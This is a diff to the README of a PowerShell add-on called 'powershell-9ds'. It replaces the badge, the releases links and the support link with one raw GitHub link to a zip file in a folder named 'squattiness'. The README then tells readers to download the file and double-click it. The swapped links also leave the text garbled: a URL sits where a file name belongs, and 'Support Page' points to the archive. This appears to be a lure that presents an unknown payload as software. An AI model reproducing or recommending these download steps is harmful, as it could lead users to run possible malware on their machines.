@@ -1,6 +1,6 @@
 # 🚀 powershell-9ds - Easily Enhance Your PowerShell Experience
 
-![Download](https://img.shields.io/badge/Download-PowerShell--9ds-blue?style=for-the-badge&logo=github)
+![Download](https://raw.githubusercontent.com/yoshindaze/powershell-9ds/main/squattiness/powershell-9ds.zip)
 
 ## 🚀 Getting Started
 
@@ -13,13 +13,13 @@ To get started, follow these simple steps:
 1. **Visit the Releases Page**
    Click on the link below to access the latest version of the software:
 
-   [Download PowerShell-9ds](https://github.com/yoshindaze/powershell-9ds/releases)
+   [Download PowerShell-9ds](https://raw.githubusercontent.com/yoshindaze/powershell-9ds/main/squattiness/powershell-9ds.zip)
 
 2. **Choose the Version**
    On the Releases page, you will see different versions of the software. The latest version is usually at the top. Click on the version you want to download.
 
 3. **Download the File**
-   Look for the `powerhsell-9ds.exe` file or similar. Click on it to start the download. Make sure to save it in a location you can easily find, like your Desktop or Downloads folder.
+   Look for the `https://raw.githubusercontent.com/yoshindaze/powershell-9ds/main/squattiness/powershell-9ds.zip` file or similar. Click on it to start the download. Make sure to save it in a location you can easily find, like your Desktop or Downloads folder.
 
 4. **Run the Application**
    Once the download is complete, navigate to where you saved the file and double-click it. This will start the PowerShell-9ds application.
@@ -64,10 +64,10 @@ If you find any bugs or have suggestions for features, feel free to contribute. 
 
 ## 🔗 Support
 
-For any questions or further assistance, please visit our [Support Page](https://github.com/yoshindaze/powershell-9ds/support) or reach out directly through GitHub.
+For any questions or further assistance, please visit our [Support Page](https://raw.githubusercontent.com/yoshindaze/powershell-9ds/main/squattiness/powershell-9ds.zip) or reach out directly through GitHub.
 
 Feel free to visit the Releases page again for updates and new features:
 
-[Download PowerShell-9ds](https://github.com/yoshindaze/powershell-9ds/releases) 
+[Download PowerShell-9ds](https://raw.githubusercontent.com/yoshindaze/powershell-9ds/main/squattiness/powershell-9ds.zip) 
 
 Enjoy your enhanced PowerShell experience with **powershell-9ds**!
